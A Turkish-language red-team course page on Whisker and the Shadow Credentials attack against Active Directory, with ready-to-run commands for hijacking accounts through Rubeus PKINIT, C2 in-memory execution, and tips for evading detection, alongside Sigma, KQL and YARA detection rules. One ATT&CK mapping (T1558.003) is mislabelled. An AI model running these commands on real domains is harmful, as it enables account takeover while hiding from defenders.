# Whisker

> **Kategori:** [8. Active Directory Sertifika Servisleri](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Lee Christensen (@tifkin_) ve Will Schroeder (@harmj0y) tarafından geliştirilen; hedef Active Directory kullanıcı veya bilgisayar nesneleri üzerinde yazma hakkına (`GenericAll`, `GenericWrite`, `WriteProperty`) sahip olunduğunda, nesnenin `msDS-KeyCredentialLink` özniteliğine genel anahtar enjekte ederek (Shadow Credentials / Gölge Kimlik Bilgisi) parola sıfırlamadan ve CA gerektirmeden PKINIT üzerinden Kerberos TGT biletini alan C# tabanlı sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde bir saldırganın veya operatörün hedef kullanıcı üzerinde yazma hakkı (`GenericAll`, `GenericWrite`, `WriteDacl` veya `WriteOwner`) elde etmesi sıkça karşılaşılan bir durumdur. Geleneksel yöntemlerde operatörler hedef kullanıcının parolasını zorla sıfırlamak (`net user <kullanıcı> <yeni_parola> /domain`) zorunda kalırdı. Ancak parola sıfırlamak; kurban kullanıcının oturumunu kilitleyen, kurumsal e-posta ve VPN erişimlerini koparan, anında yardım masasına (Help Desk) şikayet düşüren ve EDR/SIEM alarmlarını (Event ID 4724) tetikleyen son derece gürültülü ve operasyonel açıdan yıkıcı bir tekniktir.

SpecterOps araştırmacıları Lee Christensen ve Will Schroeder, Windows Server 2016 ile birlikte Windows Hello for Business (WHfB) altyapısını desteklemek için Active Directory şemasına eklenen **`msDS-KeyCredentialLink`** özniteliğini inceleyerek çığır açan **"Gölge Kimlik Bilgileri" (Shadow Credentials)** tekniğini geliştirmiştir.

**`Whisker`**, bu saldırıyı otomatikleştiren bir C# (.NET) aracıdır. Whisker şu devrimsel yaklaşımla çalışır:
1. **Sıfır Parola Değişikliği:** Hedef kullanıcının mevcut parolası asla değiştirilmez; kullanıcı hiçbir kesinti hissetmez.
2. **Sertifika Yetkilisi (CA) Bağımsızlığı:** Ortamda kurulu bir AD CS (Sertifika Sunucusu) bulunması gerekmez. Etki alanı denetleyicisinde basit bir KDC sertifikası bulunması yeterlidir.
3. **Kendi Kendine İmzalı Anahtar Çifti:** Whisker, yerel olarak geçici bir RSA anahtar çifti ve X.509 sertifikası üretir. Genel anahtarı (Public Key) ikili `KEYCREDENTIALLINK_BLOB` formatına dönüştürerek LDAP üzerinden hedef nesnenin `msDS-KeyCredentialLink` özniteliğine yazar.
4. **PKINIT ile TGT Hasadı:** KDC, nesnenin `msDS-KeyCredentialLink` alanında bu genel anahtarı gördüğünde, saldırganın elindeki özel anahtarla yaptığı PKINIT kimlik doğrulama isteğini (AS-REQ) koşulsuz kabul eder ve hedef kullanıcı adına geçerli bir TGT teslim eder.
5. **Kusursuz İz Temizliği (Rollback):** TGT bileti alındıktan sonra Whisker, enjekte ettiği anahtarı `msDS-KeyCredentialLink` özniteliğinden siler (`Whisker.exe remove`); nesneyi orijinal tertemiz haline geri döndürür.

### `msDS-KeyCredentialLink` İkili Yapısı

`msDS-KeyCredentialLink`, Microsoft tarafından tanımlanan `KEYCREDENTIALLINK_BLOB` ikili veri yapısını barındırır:
- **Version (4 Bayt):** Yapı sürümü (Genellikle `0x00000200`).
- **KeyMaterial (Değişken):** Hedef anahtarın ham RSA genel anahtar verisi.
- **KeyUsage (1 Bayt):** Anahtarın kullanım amacı (`0x01 = NGC / WHfB`, `0x02 = FIDO`).
- **KeySource (1 Bayt):** Anahtar kaynağı (`0x00 = AD`).
- **DeviceId (GUID - 16 Bayt):** Cihazı veya enjeksiyonu tekil olarak tanımlayan benzersiz kimlik.
- **CustomKeyInformation (Değişken):** Ek meta veriler ve zaman damgaları.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│               SALDIRGAN MAKİNESİ (C# / IN-MEMORY EXECUTION)            │
│                                                                        │
│  [ Whisker.exe add /target:da_user ]                                   │
│         │                                                              │
│         ├── (1) Yerel 2048-bit RSA Anahtar Çifti ve Sertifika Üretimi  │
│         │                                                              │
│         ├── (2) Genel Anahtar KEYCREDENTIALLINK_BLOB Olarak Paketlenir │
│         │                                                              │
│         ├── (3) LDAP/LDAPS (TCP 389/636) Üzerinden Hedefe Yazılır:     │
│         │       msDS-KeyCredentialLink = [ BLOB ]                      │
│         │                                                              │
│         ▼                                                              │
│  [ ACTIVE DIRECTORY ETKİ ALANI DENETLEYİCİSİ (DC / KDC) ]              │
│         │                                                              │
│         ├── Dizin Veritabanına (NTDS.dit) Yeni Genel Anahtar Kaydedilir│
│         │                                                              │
│         ▼                                                              │
│  [ Rubeus.exe asktgt /certificate:<PFX> /password:<PWD> /ptt ]         │
│         │                                                              │
│         ├── (4) PKINIT Pre-Auth (AS-REQ) ile KDC'ye Başvurulur         │
│         │                                                              │
│         ├── (5) KDC, msDS-KeyCredentialLink'teki Genel Anahtarla       │
│         │       İmzayı Doğrular ve TGT Biletini Döner                  │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: da_user TGT Bileti Oturuma Enjekte Edilir ]                  │
│         │                                                              │
│  [ Whisker.exe remove /target:da_user /deviceid:<GUID> ]               │
│         │                                                              │
│         └── (6) Enjekte Edilen Anahtar Dizin Nesnesinden Silinir (OPSEC)│
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Parola Sıfırlama (Force Reset) | Shadow Credentials (Whisker) |
|---|---|---|
| **Kullanıcı Etkisi** | Kullanıcının tüm oturumları düşer, parola anında değişir. | Kullanıcı hiçbir şey fark etmez, mevcut parola aynen çalışır. |
| **Savunma Alarmları** | Event ID 4724 (Parola Sıfırlama) kritik alarm üretir. | Event 5136 oluşur ancak modern ortamda WHfB cihaz kaydı gibi görünür. |
| **Gereken Altyapı** | Yalnızca kullanıcı yazma yetkisi. | Yalnızca nesne yazma yetkisi (AD CS sunucusuna ihtiyaç YOKTUR). |
| **Geri Alınabilirlik** | Eski parola bilinmediğinden parola eski haline getirilemez. | Whisker tek komutla (`remove`) eklediği anahtarı silerek sistemi temizler. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | Whisker | pyWhiskey | Certipy (shadow) | PowerView (Set-DomainObject) |
|---|---|---|---|---|
| **Geliştirme Dili** | C# (.NET) | Python | Python | PowerShell |
| **Platform** | Windows (Yerel / In-Memory) | Linux / Windows | Linux / Windows | Windows (PowerShell) |
| **C2 Entegrasyonu** | 🟢 Kusursuz (`execute-assembly`) | 🔴 Desteklemez | 🔴 Desteklemez | 🟡 Script Block Logging riski |
| **Otomatik Rubeus Komutu** | 🟢 Hazır kopyala-yapıştır üretir | 🔴 Yok (Manuel) | 🟢 Kendisi auth yapar | 🔴 Manuel ASN.1 gerektirir |
| **Tekil GUID Temizliği** | 🟢 Var (`/deviceid:`) | 🟢 Var | 🟢 Var | 🔴 Tüm özniteliği sıfırlar |
| **Bellek Ayak İzi** | Minimal C# ikilisi | Harici Python ortamı | Harici Python ortamı | Yüksek PowerShell belleği |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Whisker, yürütülecek ana eyleme (`add`, `list`, `remove`, `clear`) göre yapılandırılmıştır.

### Genel Sözdizimi

```cmd
Whisker.exe <Eylem> /target:<HedefHesap> [Seçenekler]
```

### Ana Eylemler

- **`add`:** Hedef nesneye yeni bir Shadow Credential enjekte eder, PFX sertifikasını üretir ve Rubeus komutunu hazırlar.
- **`list`:** Hedef nesnenin `msDS-KeyCredentialLink` özniteliğindeki mevcut tüm kayıtlı anahtarları ve Device ID'lerini listeler.
- **`remove`:** Belirtilen Device ID'ye sahip tekil bir anahtarı nesneden siler.
- **`clear`:** Hedef nesnedeki TÜM kayıtlı Shadow Credential anahtarlarını temizler (Dikkat: Meşru WHfB anahtarlarını da siler!).

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `/target:HESAP` | Hedef kullanıcı veya bilgisayar hesabının `sAMAccountName` veya Distinguished Name (DN) değeri. | `/target:da_admin` veya `/target:DC01$` |
| `/domain:DOMAIN` | Hedef Active Directory etki alanının adı (FQDN). | `/domain:corp.local` |
| `/dc:DC_IP` | LDAP sorgularının ve değişikliklerinin gönderileceği Domain Controller adresi. | `/dc:10.10.10.1` |
| `/path:DOSYA_YOLU` | Üretilen PFX sertifikasının kaydedileceği dosya yolu (Varsayılan: Konsola Base64 basar). | `/path:C:\Temp\shadow.pfx` |
| `/password:PAROLA` | Üretilen PFX sertifikasını koruyacak şifre (Varsayılan rastgele üretilir). | `/password:ShadowPass2026!` |
| `/deviceid:GUID` | (`remove` modunda) Silinmek istenen anahtarın benzersiz Device ID GUID değeri. | `/deviceid:d7b4a2e1-4891-4c12-...` |
| `/certificate:BASE64` | (`remove` modunda) Sertifika verisinden Device ID'yi otomatik türeterek silme. | `/certificate:MII...` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kullanıcı Hesabına Shadow Credential Enjeksiyonu ve Hazır Rubeus Komutu

Yazma hakkı bulunan bir Domain Admin (`da_john`) hesabına anahtar enjekte etmek ve sertifikayı Base64 olarak ekrana almak:

```cmd
Whisker.exe add /target:da_john /domain:corp.local /dc:dc01.corp.local
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> Whisker.exe add /target:da_john /domain:corp.local /dc:dc01.corp.local

   __        ___     _     _             
   \ \      / / |__ (_)___| | _____ _ __ 
    \ \ /\ / /| '_ \| / __| |/ / _ \ '__|
     \ V  V / | | | | \__ \   <  __/ |   
      \_/\_/  |_| |_|_|___/_|\_\___|_|   
  v1.0.0

[*] Action: Add
[*] Target: da_john
[*] Domain: corp.local
[*] DC    : dc01.corp.local

[*] Generating 2048-bit RSA key pair...
[*] Creating self-signed certificate...
[*] Generating KeyCredential binary structure...
    Version   : 2
    KeyUsage  : NGC (0x01)
    KeySource : AD (0x00)
    DeviceId  : e821a412-9842-4f12-a102-4821aef72101

[*] Connecting to LDAP server 'dc01.corp.local'...
[+] Successfully bound to LDAP!
[*] Writing KeyCredential to 'msDS-KeyCredentialLink' on 'CN=da_john,OU=Admins,DC=corp,DC=local'...
[+] Successfully wrote KeyCredential to target object!

[+] Certificate Base64:
    MIIKbAIBAzCCCV8GCSqGSIb3DQEHAaCCCV... [Base64 PFX Verisi] ...==

[+] Certificate Password:
    k9#Xp!2Lz@1

[*] Rubeus command:
    Rubeus.exe asktgt /user:da_john /certificate:MIIKbAIBAzCCCV... /password:"k9#Xp!2Lz@1" /domain:corp.local /dc:dc01.corp.local /ptt

[*] Cleanup command:
    Whisker.exe remove /target:da_john /deviceid:e821a412-9842-4f12-a102-4821aef72101
```

*Çıktı Yorumu:* Whisker anahtarı LDAP üzerinden başarıyla yazmış, PKINIT için hazır Rubeus komutunu ve operasyon sonrası izleri temizlemek için gereken `remove` komutunu DeviceId ile birlikte üretmiştir.

### Senaryo 2: Bilgisayar Hesabına (DC Hariç) Enjeksiyon ve S4U2self ile Domain Admin Taklidi (RBCD Zincirleme)

Bir sunucu makine hesabı (`SQLSRV01$`) üzerinde `GenericWrite` yetkisi olduğunda:
1. Makine hesabına Shadow Credential enjekte edilir:
   ```cmd
   Whisker.exe add /target:SQLSRV01$
   ```
2. Rubeus ile makine hesabı adına TGT alınır:
   ```cmd
   Rubeus.exe asktgt /user:SQLSRV01$ /certificate:<PFX> /password:<PWD> /ptt
   ```
3. Makine kimliğiyle S4U2self uygulanarak sunucu üzerinde Administrator adına servis bileti (TGS) türetilir ve yerel yönetici olunur.

### Senaryo 3: Hedef Nesnedeki Kayıtlı Gölge Kimlik Bilgilerini Listeleme

Hedef hesapta daha önceden meşru veya saldırgan tarafından eklenmiş anahtarları denetlemek:

```cmd
Whisker.exe list /target:da_john
```

**Örnek Konsol Çıktısı:**

```text
[*] Action: List
[*] Target: da_john

[*] Found 1 KeyCredential entry:
    Entry #1:
      DeviceId         : e821a412-9842-4f12-a102-4821aef72101
      KeyUsage         : NGC (0x01)
      KeySource        : AD (0x00)
      CreationTime     : 10/14/2026 19:40:12
      Key Length       : 2048 bits
```

### Senaryo 4: Operasyon Sonrası İz Temizliği (Tekil Anahtar Silme)

TGT bileti oturuma alındıktan sonra, hedef kullanıcının olası meşru anahtarlarına zarar vermeden yalnızca sızma testinde eklenen anahtarı silmek:

```cmd
Whisker.exe remove /target:da_john /deviceid:e821a412-9842-4f12-a102-4821aef72101
```

Bu işlem sonucunda `msDS-KeyCredentialLink` özniteliğindeki ilgili Device ID kaydı kaldırılır; kullanıcı nesnesi sızma testi öncesindeki orijinal haline döndürülür.

### Senaryo 5: Sertifikayı Diske Parola Korumalı Kaydetme

Base64 dizesi yerine doğrudan `.pfx` dosyası oluşturup farklı bir araçla (Linux `certipy auth`) kullanmak:

```cmd
Whisker.exe add /target:da_john /path:C:\Temp\shadow_cert.pfx /password:ComplexPwn2026!
```

### Senaryo 6: C2 Bellek İçi Yürütme (Cobalt Strike / Sliver)

Diske hiçbir dosya yazmadan doğrudan Beacon komut isteminden çalıştırma:

```text
beacon> execute-assembly /opt/GhostPack/Whisker.exe add /target:da_john /domain:corp.local
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `WILL_NOT_PERFORM (0x35) / 0000052D: SvcErr: DSID-031A11EF` | Hedef etki alanının Orman ve Etki Alanı İşlev Seviyesi (Domain Functional Level) Windows Server 2016'nın altındadır (Örn: Server 2012 R2). | `msDS-KeyCredentialLink` özniteliği en az Windows Server 2016 DFL gerektirir. DFL seviyesi yükseltilemiyorsa bu teknik uygulanamaz; RBCD veya klasik ACL sömürülerine yönelinmelidir. |
| `INSUFFICIENT_ACCESS_RIGHTS (0x32)` | Mevcut kullanıcının hedef nesne üzerinde `GenericAll`, `GenericWrite` veya `WriteProperty msDS-KeyCredentialLink` yetkisi bulunmamaktadır. | BloodHound üzerinden nesne ACL'leri tekrar denetlenmeli; yazma hakkı olan doğru kullanıcı veya bilgisayar hesabı hedeflenmelidir. |
| `KDC_ERR_PADATA_TYPE_NOSUPP (0x10)` | Rubeus ile TGT talep edilirken Domain Controller PKINIT desteklemediğini bildirmiştir. | Hedef Domain Controller üzerinde geçerli bir KDC sertifikası kurulu değildir. Etki alanında başka bir DC varsa `/dc:<DİĞER_DC>` ile o denenmeli veya DC sertifikası yüklenmesi beklenmelidir. |
| `LdapException: The LDAP server is unavailable` | Domain Controller'ın 389 (LDAP) veya 636 (LDAPS) portuna ağ seviyesinde erişilememektedir. | Güvenlik duvarı kuralları ve DNS çözümlemesi kontrol edilmeli; `/dc:<IP>` bayrağı ile doğrudan geçerli DC IP'si verilmelidir. |
| `Device ID not found during remove` | Silme komutunda belirtilen DeviceId GUID değeri hedef nesnede mevcut değildir veya daha önce silinmiştir. | Önce `Whisker.exe list /target:<Hesap>` çalıştırılarak nesnede aktif olan gerçek GUID kopyalanmalı ve `remove` komutuna verilmelidir. |
| `STRONG_AUTH_REQUIRED (0x08)` | Domain Controller üzerinde LDAP Kanal Bağlama (Channel Binding) veya LDAP İmzalama zorunludur; düz metin LDAP reddedilmiştir. | Whisker varsayılan olarak LDAPS (Port 636) kullanmalıdır. Sertifika güveni için DC FQDN adı kullanılmalı veya LDAPS bağlantısı tercih edilmelidir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ CA Trafiği / İzi ]: 🟢 SIFIR (CA sunucusu tamamen devre dışıdır)    │
│  [ Parola Değişimi ] : 🟢 SIFIR (Mevcut parola asla sıfırlanmaz)       │
│  [ LDAP Nesne İzi ]  : 🔴 YÜKSEK (Event 5136 msDS-KeyCredentialLink)  │
│  [ DC Logları ]      : 🔴 YÜKSEK (Event 4768 PKINIT Pre-Auth Olayı)   │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Dizin Değişiklik Günlükleri (Directory Service Changes):**
   - **Event ID 5136:** Bir dizin nesnesi özniteliği değiştirildi.
     - `AttributeLDAPDisplayName: msDS-KeyCredentialLink`
     - `Type: Value Added` (Saldırı anı) ve ardından `Type: Value Deleted` (Temizlik anı).
     - Bu olay, hedef nesnenin adını ve değişikliği yapan saldırgan kullanıcının kimliğini açıkça kaydeder.
2. **Kerberos Kimlik Doğrulama Günlükleri:**
   - **Event ID 4768:** Kerberos TGT isteği. `Pre-Authentication Type: 16` (PKINIT). Sertifika veren (Issuer) alanında standart bir kurumsal CA yerine kendinden imzalı sertifika konusu görünür.
3. **Uç Nokta Sysmon Günlükleri:**
   - **Event ID 1 (Process Create):** Komut satırında `add /target:`, `Whisker`, `/deviceid:` argümanlarının geçmesi.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Trafiği:** `msDS-KeyCredentialLink` özniteliğine yönelik `LDAP_MOD_ADD` ve `LDAP_MOD_DELETE` operasyonları.
- **PKINIT AS-REQ:** Kurumsal CA altyapısı bulunmayan bir ağda beklenmedik şekilde DC'ye PKINIT istekleri gelmesi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1556** | Modify Authentication Process | `msDS-KeyCredentialLink` manipülasyonu ile alternatif kimlik doğrulama anahtarı ekleme. |
| **T1098** | Account Manipulation | Hedef kullanıcı/bilgisayar nesnesi özniteliklerinin değiştirilmesi. |
| **T1558.003** | Kerberos Ticket Granting Tickets | Eklenen Shadow Credential üzerinden PKINIT ile TGT elde edilmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Parola sıfırlamadan hedef hesaba meşru kimlik bileti ile erişim. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Kalıcı Öznitelik İzi (Event 5136)** | TGT bileti alındıktan sonra hedef nesne asla kirli bırakılmamalı; `Whisker.exe remove` ile eklenen DeviceId anında silinmelidir. |
| **`clear` Komutunun Tehlikesi** | Asla `clear` komutu kullanmayın! Eğer hedef kullanıcının meşru bir Windows Hello cihazı varsa onun anahtarını da siler ve kullanıcıyı kilitler. Yalnızca spesifik `remove /deviceid:` kullanın. |
| **Diske PFX Dosyası Yazılması** | PFX dosyasını diske kaydetmeyin; Base64 çıktısını doğrudan komut satırından hafıza içi çalışan Rubeus'a iletin. |
| **Anormal Çalışma Saatleri** | Shadow Credential enjeksiyonunu mesai saatleri içinde yapın; gece yarısı yapılan `msDS-KeyCredentialLink` değişiklikleri SIEM kurallarında anomali olarak öne çıkar. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: msDS-KeyCredentialLink Öznitelik Değişikliği (Shadow Credentials) Tespiti

```yaml
title: Shadow Credentials KeyCredentialLink Modification
id: a81249b1-3812-4f12-9812-39821034fe01
status: experimental
description: Detects modification of the msDS-KeyCredentialLink attribute indicative of Whisker / Shadow Credentials attack.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
  condition: selection
falsepositives:
  - Legitimate Windows Hello for Business (WHfB) device registrations by authorized users
level: high
tags:
  - attack.credential_access
  - attack.t1556
  - attack.t1098
```

#### Microsoft Sentinel KQL Sorgusu: Hızlı Ekleme-Silme (Whisker Temizlik) Korelasyonu

```kql
// Bir nesneye msDS-KeyCredentialLink eklenip 15 dakika içinde silinmesi (Saldırı ve Temizlik döngüsü)
let AddedKeys = SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 5136
| extend EventDataXML = parse_xml(EventData)
| extend Attr = tostring(EventDataXML.EventData.Data[7])
| extend OpType = tostring(EventDataXML.EventData.Data[8])
| extend TargetDN = tostring(EventDataXML.EventData.Data[4])
| where Attr == "msDS-KeyCredentialLink" and OpType == "%%14674" // Value Added
| project AddedTime = TimeGenerated, TargetDN, SubjectUserName;
let DeletedKeys = SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 5136
| extend EventDataXML = parse_xml(EventData)
| extend Attr = tostring(EventDataXML.EventData.Data[7])
| extend OpType = tostring(EventDataXML.EventData.Data[8])
| extend TargetDN = tostring(EventDataXML.EventData.Data[4])
| where Attr == "msDS-KeyCredentialLink" and OpType == "%%14675" // Value Deleted
| project DeletedTime = TimeGenerated, TargetDN;
AddedKeys
| join kind=inner (DeletedKeys) on TargetDN
| where DeletedTime between (AddedTime .. (AddedTime + 15m))
| project AddedTime, DeletedTime, TargetDN, SubjectUserName
```

#### YARA Kuralı: Whisker Binary ve KeyCredential Parser Tespiti

```yara
rule PostExploit_Whisker_ShadowCredentials {
    meta:
        description = "Detects compiled Whisker .NET assembly, Shadow Credentials flags and methods"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "Whisker" ascii wide
        $s2 = "msDS-KeyCredentialLink" ascii wide
        $s3 = "Generating 2048-bit RSA key pair" ascii wide
        $s4 = "KeyCredential binary structure" ascii wide
        $s5 = "/target:" ascii wide
        $s6 = "/deviceid:" ascii wide
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3, $s4, $s5, $s6)
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Kullanıcı Hesabına Shadow Credential Ekleme ve Rubeus Çıktısı Alma
```cmd
Whisker.exe add /target:da_user
```
- **Ne Yapar?** Hedef kullanıcının `msDS-KeyCredentialLink` alanına yeni bir genel anahtar enjekte eder ve TGT almak için hazır Rubeus komutunu üretir.
- **Ne Zaman Kullanılır?** Hedef hesapta yazma yetkisi (`GenericWrite` / `GenericAll`) olduğunda parola sıfırlamadan yetki almak için.
- **Parametreler:** `/target`: Hedef kullanıcı adı (`sAMAccountName`).

### Komut 2: Bilgisayar Hesabına Shadow Credential Enjeksiyonu
```cmd
Whisker.exe add /target:WEBSRV01$ /domain:corp.local /dc:10.10.10.1
```
- **Ne Yapar?** Belirtilen sunucu makine hesabına Shadow Credential ekler.
- **Ne Zaman Kullanılır?** Sunucu üzerinde yazma hakkı olduğunda makine TGT'si alıp RBCD veya S4U yetki yükseltmesi yapmak için.
- **Parametreler:** `/target`: Makine hesabı adı (`$` ile biten), `/dc`: Hedef etki alanı denetleyicisi.

### Komut 3: Hedef Nesnedeki Kayıtlı Anahtarları Listeleme
```cmd
Whisker.exe list /target:da_user
```
- **Ne Yapar?** Hedef nesnede tanımlı tüm Device ID ve anahtar bilgilerini listeler.
- **Ne Zaman Kullanılır?** Önceden eklenmiş anahtarları veya silinecek Device ID'yi tespit etmek için.
- **Parametreler:** `list`: Listeleme eylemi.

### Komut 4: Eklenen Anahtarı Device ID ile Güvenle Silme (OPSEC Temizliği)
```cmd
Whisker.exe remove /target:da_user /deviceid:e821a412-9842-4f12-a102-4821aef72101
```
- **Ne Yapar?** Yalnızca belirtilen Device ID'ye sahip anahtarı kaldırır; kullanıcının olası meşru anahtarlarına dokunmaz.
- **Ne Zaman Kullanılır?** TGT bileti alındıktan hemen sonra nesneyi temizlemek için.
- **Parametreler:** `/deviceid`: Silinecek tekil anahtarın GUID değeri.

### Komut 5: Sertifikayı Diske Parola Korumalı Kaydetme
```cmd
Whisker.exe add /target:da_user /path:C:\Temp\da.pfx /password:Pwned2026!
```
- **Ne Yapar?** Üretilen PFX sertifikasını ekrana basmak yerine belirtilen yola ve şifreye kaydeder.
- **Ne Zaman Kullanılır?** Sertifikayı Linux veya harici bir araca taşımak gerektiğinde.
- **Parametreler:** `/path`: Hedef dosya yolu, `/password`: PFX şifresi.

### Komut 6: Sertifika Verisi Üzerinden Otomatik Silme
```cmd
Whisker.exe remove /target:da_user /certificate:MIIKbAIBAzCCCV8...==
```
- **Ne Yapar?** Base64 sertifika verisini ayrıştırarak içindeki Device ID'yi otomatik bulur ve nesneden siler.
- **Ne Zaman Kullanılır?** Device ID GUID'i elle kopyalamak yerine sertifika dizesiyle doğrudan temizlik yapmak için.
- **Parametreler:** `/certificate`: Üretilen Base64 sertifika verisi.

### Komut 7: Farklı Domain Controller Belirterek Enjeksiyon
```cmd
Whisker.exe add /target:da_user /dc:dc02.corp.local
```
- **Ne Yapar?** LDAP işlemlerini birincil DC yerine ikincil DC üzerinden yürütür.
- **Ne Zaman Kullanılır?** Birincil DC izleniyorsa veya kısıtlıysa ağ trafiğini dağıtmak için.
- **Parametreler:** `/dc`: Hedef etki alanı denetleyicisi FQDN veya IP.

### Komut 8: Belirli Bir Domain FQDN Tanımlayarak Çalıştırma
```cmd
Whisker.exe add /target:da_user /domain:child.corp.local
```
- **Ne Yapar?** Alt etki alanındaki (Child Domain) kullanıcı nesnesini hedefler.
- **Ne Zaman Kullanılır?** Çoklu alan adı (Forest) yapılarında çapraz etki alanı saldırılarında.
- **Parametreler:** `/domain`: Hedef etki alanı adı.

### Komut 9: Hedef Nesnedeki TÜM Anahtarları Sıfırlama (Zorunlu Durumlar)
```cmd
Whisker.exe clear /target:da_user
```
- **Ne Yapar?** Hedef nesnenin `msDS-KeyCredentialLink` özniteliğini tamamen boşaltır (NULL yapar).
- **Ne Zaman Kullanılır?** Device ID kaybolduğunda ve nesneyi kesin olarak temizlemek gerektiğinde (Dikkatli kullanılmalıdır!).
- **Parametreler:** `clear`: Tüm anahtarları siler.

### Komut 10: Rubeus ile Zincirleme Tek Satır Sömürü
```cmd
Whisker.exe add /target:da_user /path:C:\Temp\t.pfx /password:p && Rubeus.exe asktgt /user:da_user /certificate:C:\Temp\t.pfx /password:p /ptt
```
- **Ne Yapar?** Anahtarı enjekte eder, sertifikayı yazar ve hemen Rubeus ile TGT alıp komut istemine aktarır.
- **Ne Zaman Kullanılır?** Hızlı penetrasyon testi senaryolarında anında oturum yükseltmek için.
- **Parametreler:** Komut zincirleme (`&&`).

---

## Kaynaklar

- **Resmi GitHub Reposu:** [GhostPack / Whisker](https://github.com/GhostPack/Whisker)
- **SpecterOps Araştırma Makalesi:** [Shadow Credentials: Abusing msDS-KeyCredentialLink](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- **Elad Shamir Araştırması:** [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://eladshamir.com/2019/01/28/wagging-the-dog/)
- **MITRE ATT&CK Referansı:** [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)

---

> **Önceki:** [← ForgeCert](./ForgeCert.md) · **Sonraki:** [pyWhiskey →](./pyWhiskey.md)
